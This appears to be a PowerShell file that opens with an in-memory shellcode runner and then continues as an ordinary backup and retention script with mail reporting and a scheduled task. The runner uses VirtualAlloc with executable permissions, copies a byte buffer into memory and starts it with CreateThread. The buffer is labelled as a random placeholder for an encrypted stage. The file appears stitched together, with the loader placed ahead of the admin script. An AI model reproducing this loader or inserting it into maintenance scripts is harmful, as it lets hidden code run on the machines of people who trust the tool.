
$LogPath = "$env:TEMP\loader.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x79, 0x37, 0x0a, 0x21, 0x5a, 0x76, 0xac, 0x2a, 0x27, 0x6f, 0x24, 0xd6, 0x23, 0xa8, 0xf2, 0x3b,
    0x12, 0xa4, 0x59, 0x86, 0x45, 0xce, 0x70, 0x9e, 0x18, 0xb2, 0x89, 0xef, 0x66, 0xbb, 0xbf, 0xaf,
    0xfa, 0x07, 0xf8, 0x9a, 0x56, 0x20, 0x6d, 0xca, 0x92, 0x3c, 0x58, 0x0c, 0x45, 0x21, 0xbf, 0x45,
    0xed, 0x67, 0xa1, 0x7e, 0x78, 0x2f, 0xb8, 0x2d, 0x4e, 0x67, 0xcd, 0x1d, 0x3f, 0x81, 0x5b, 0x4c,
    0x33, 0x84, 0x48, 0xaa, 0x6d, 0x21, 0x64, 0x90, 0xd6, 0xab, 0xe8, 0x5a, 0xfe, 0x2e, 0xd7, 0x20,
    0xb9, 0x87, 0x09, 0x89, 0x71, 0xdf, 0x34, 0xd7, 0xaa, 0x7c, 0xb0, 0x48, 0x11, 0x1e, 0x32, 0x7a,
    0xaa, 0x81, 0xbb, 0xc4, 0x87, 0xff, 0xf6, 0xba, 0xd3, 0xef, 0xc8, 0xaa, 0xed, 0x90, 0x8d, 0x90,
    0xc3, 0x6a, 0x04, 0xcf, 0xfd, 0x42, 0x2d, 0xc1, 0x50, 0xd0, 0x03, 0xa8, 0x29, 0x61, 0x9f, 0x94,
    0xdc, 0x82, 0xd3, 0x0f, 0x18, 0x40, 0x56, 0x32, 0x96, 0xd3, 0xbd, 0x0f, 0x3e, 0xa7, 0xb6, 0x94,
    0x98, 0x96, 0xdc, 0x89, 0xb4, 0x02, 0x05, 0xdd, 0xe8, 0xfc, 0x1a, 0x81, 0x31, 0x96, 0x46, 0xc6,
    0x12, 0x12, 0x80, 0x3f, 0x5a, 0xfe, 0x13, 0x2a, 0x33, 0x59, 0xce, 0xbb, 0xc9, 0x86, 0x76, 0xc7,
    0x98, 0xfc, 0xe7, 0x50, 0xef, 0x8c, 0xd7, 0x73, 0xe5, 0xc6, 0xf4, 0x7b, 0x23, 0xce, 0xf2, 0x10,
    0xec, 0xf7, 0x31, 0x9b, 0x86, 0x47, 0x44, 0xdd, 0x33, 0xc2, 0x09, 0x0b, 0x0f, 0xc4, 0xf5, 0xe4,
    0xb2, 0x1e, 0x5d, 0x08, 0xf0, 0x29, 0x50, 0x48, 0x8e, 0xa9, 0x8d, 0x88, 0xbc, 0x58, 0xf3, 0x45,
    0x8f, 0xe0, 0x03, 0xa2, 0x6c, 0x2e, 0x20, 0x4d, 0xe2, 0x43, 0x93, 0x7c, 0x4f, 0x40, 0xaf, 0x8c,
    0x31, 0x4d, 0xa9, 0x6f, 0xda, 0x9d, 0x48, 0x66, 0x66, 0x28, 0x2f, 0x76, 0xfb, 0x98, 0x17, 0x72,
    0xb7, 0x93, 0xdb, 0x9b, 0x6c, 0x4f, 0x76, 0x30, 0xe5, 0x8b, 0x0b, 0xcc, 0x5a, 0x33, 0x1a, 0x22,
    0x99, 0x34, 0x8d, 0x3f, 0x03, 0x12, 0x24, 0x64, 0x4a, 0xdc, 0x8c, 0x71, 0xab, 0x05, 0xf2, 0x2f,
    0x22, 0xf5, 0xf8, 0x28, 0xdf, 0xce, 0x1c, 0x5d, 0x87, 0x57, 0x6e, 0xdc, 0xee, 0x83, 0xad, 0xfd,
    0x0b, 0x90, 0xf1, 0xc8, 0xb1, 0x5b, 0xd7, 0x9c, 0x0e, 0x92, 0x08, 0xcc, 0xf1, 0x69, 0x2f, 0x2b,
    0x19, 0xbf, 0x1b, 0x66, 0xb6, 0x65, 0xb3, 0xbb, 0xe3, 0x33, 0x59, 0x89, 0x92, 0xd4, 0xda, 0x0d,
    0x2b, 0x70, 0x79, 0x4c, 0x92, 0xf5, 0x38, 0xfe, 0xb7, 0x3c, 0xd2, 0x85, 0xd7, 0x87, 0x8e, 0xa8,
    0x33, 0xcd, 0xe3, 0x4c, 0xf4, 0x10, 0x24, 0xe3, 0xad, 0xea, 0x4d, 0x8d, 0x21, 0xd2, 0x92, 0xcd,
    0xe1, 0x96, 0x80, 0x4a, 0x1e, 0xd1, 0x4e, 0x0e, 0x69, 0xbb, 0xcb, 0x2a, 0x2a, 0x16, 0x91, 0xfa,
    0x25, 0xb6, 0x2f, 0x92, 0x41, 0xbc, 0x41, 0xbb, 0x61, 0x0d, 0x94, 0x49, 0x64, 0xdc, 0x86, 0x02,
    0xfc, 0x8e, 0x1b, 0x0a, 0xa1, 0x0b, 0xa3, 0x06, 0x39, 0xe2, 0xc7, 0x46, 0x03, 0x8b, 0x27, 0xeb,
    0x7e, 0xe5, 0xb3, 0x93, 0x19, 0x7c, 0xcd, 0x60, 0x88, 0x7d, 0xf2, 0x51, 0x6a, 0x9c, 0x7c, 0xef,
    0xd4, 0x95, 0x08, 0x24, 0x96, 0x9f, 0x83, 0x92, 0xce, 0xd8, 0x2d, 0x9d, 0xe3, 0x45, 0x1a, 0xb8,
    0x03, 0x68, 0x47, 0x57, 0xdf, 0xba, 0xbe, 0x71, 0x7a, 0x04, 0x10, 0x18, 0xbe, 0x04, 0x6f, 0x16,
    0x9d, 0xd7, 0xf9, 0xa8, 0xb9, 0x5b, 0x82, 0x06, 0x86, 0x5b, 0x68, 0x0a, 0x0a, 0xab, 0x81, 0xa7,
    0xad, 0xc8, 0x1f, 0xe4, 0x99, 0x9b, 0x50, 0xbe, 0x7b, 0x51, 0x17, 0x8b, 0x0d, 0x3f, 0xfa, 0xcc,
    0xc6, 0xcc, 0x73, 0x55, 0x2b, 0xa1, 0x7e, 0xf4, 0xed, 0x0b, 0x31, 0x4b, 0x16, 0x40, 0x2b, 0xe7,
    0xbf, 0x69
)

$ProcHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($ProcHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 1095)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
param(
    [string]$SourcePath = "C:\Apps\Infra.Agent",

    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$BackupRoot = "D:\Backups\Agent",
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$RetentionDays = 30,
    [ValidateSet('Optimal', 'Fastest', 'NoCompression')]
    [string]$CompressionLevel = "NoCompression",
    [int]$MinFreeGB = 10,

    [switch]$DryRun
)

$InformationPreference = 'SilentlyContinue'

New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$archive = Join-Path -Path $BackupRoot -ChildPath ("backup-" + $stamp + ".zip")
New-Item -Path $BackupRoot -ItemType Directory -Force | Out-Null
Compress-Archive -Path (Join-Path $SourcePath '*') -DestinationPath $archive -CompressionLevel $CompressionLevel -Force

$item = Get-Item -LiteralPath $archive
$hash = Get-FileHash -LiteralPath $archive -Algorithm SHA256
$manifest = [pscustomobject]@{
    Archive   = $archive
    SizeMB    = [math]::Round($item.Length / 1MB, 2)
    SHA256    = $hash.Hash
    CreatedAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Source    = $SourcePath
}

$manifest | ConvertTo-Json -Depth 6 | Set-Content -Path (Join-Path $BackupRoot 'last-backup.json') -Encoding UTF8

$probe = Join-Path $env:TEMP ("restore-check-" + $stamp)
Expand-Archive -LiteralPath $archive -DestinationPath $probe -Force
$restored = @(Get-ChildItem -Path $probe -Recurse -File).Count
Write-Host ("Restore check: {0} files recovered" -f $restored)
$staleProbes = Get-ChildItem -Path $env:TEMP -Filter 'restore-check-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-2) }
foreach ($dir in $staleProbes) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$cutoff = (Get-Date).AddDays(-$RetentionDays)
$expired = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Where-Object { $_.LastWriteTime -lt $cutoff }
foreach ($zip in $expired) {
    Write-Host ("Expired: {0}" -f $zip.Name)
    if ($DryRun) {
        Write-Host ("Would remove {0}" -f $zip.FullName)
        continue
    }
    Remove-Item -LiteralPath $zip.FullName -Force
}

$driveLetter = $BackupRoot.Substring(0, 1)
$drive = Get-PSDrive -Name $driveLetter -ErrorAction SilentlyContinue
if ($drive) {
    $freeGB = [math]::Round($drive.Free / 1GB, 1)
    if ($freeGB -lt $MinFreeGB) {
        Write-Warning ("Low free space on backup volume: {0} GB" -f $freeGB)
    }
}

$stage = Join-Path $env:TEMP ("backup-stage-" + $stamp)
robocopy $SourcePath $stage /E /R:1 /W:2 /NP /NFL /NDL | Out-Null
if ($LASTEXITCODE -ge 8) {
    throw ("Staging copy failed with exit code {0}" -f $LASTEXITCODE)
}
$stageCount = @(Get-ChildItem -Path $stage -Recurse -File).Count
Write-Verbose ("Staged files: {0}" -f $stageCount)

$count = @(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File).Count
$totalGB = [math]::Round((@(Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Measure-Object -Property Length -Sum).Sum) / 1GB, 2)
Write-Verbose ("Archive count: {0}, total size: {1} GB" -f $count, $totalGB)
$manifest | Export-Csv -Path (Join-Path $BackupRoot 'backup-history.csv') -NoTypeInformation -Append -Encoding UTF8

$style = @'
<style>
body { font-family: Segoe UI; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($manifest) | ConvertTo-Html -Title 'Backup summary' -Head $style |
    Set-Content -Path (Join-Path $BackupRoot 'last-backup.html') -Encoding UTF8
Write-Host ("Retention window: {0} days" -f $RetentionDays) -ForegroundColor DarkGray

$MailTo = "backup-ops@adatum.com"
$MailFrom = "backup@adatum.com"
$mailBody = ("Archive: {0}`nSize: {1} MB`nSHA256: {2}" -f $archive, $manifest.SizeMB, $hash.Hash)

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "Backup completed"
    Body       = $mailBody
    SmtpServer = 'smtp.adatum.com'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

$oldStages = Get-ChildItem -Path $env:TEMP -Filter 'backup-stage-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddHours(-12) }
foreach ($dir in $oldStages) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

Write-Host ("Backup finished: {0} files in archive" -f $restored) -ForegroundColor Green

$excluded = @('*.tmp', '*.log', '*.bak')
Write-Verbose ("Excluded patterns: {0}" -f ($excluded -join ', '))

$robolog = Join-Path $BackupRoot 'robocopy.log'
robocopy $SourcePath $BackupRoot /E /R:2 /W:5 /NP /LOG:$robolog | Out-Null
if ($LASTEXITCODE -ge 8) {
    Write-Warning ("robocopy reported exit code {0}" -f $LASTEXITCODE)
}

$elapsed = Measure-Command -Expression {
    Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File | Measure-Object -Property Length -Sum
}
Write-Verbose ("Folder scan took {0:N0} ms" -f $elapsed.TotalMilliseconds)

$freeSpace = Get-PSDrive -Name ($BackupRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$largeFiles = Get-ChildItem -Path $SourcePath -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 100MB } | Sort-Object Length -Descending | Select-Object -First 5
$largeFiles | ForEach-Object {
    Write-Verbose ("Large file: {0} ({1:N1} MB)" -f $_.Name, ($_.Length / 1MB))
}

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\Scripts\Start-AppBackup.ps1'
$trigger = New-ScheduledTaskTrigger -Daily -At '20:15'
Register-ScheduledTask -TaskName 'Contoso-AppBackup' -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null

$oldArchives = Get-ChildItem -Path $BackupRoot -Filter '*.zip' -File |
    Sort-Object -Property LastWriteTime | Select-Object -First 3
$oldArchives | Format-Table Name, LastWriteTime, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
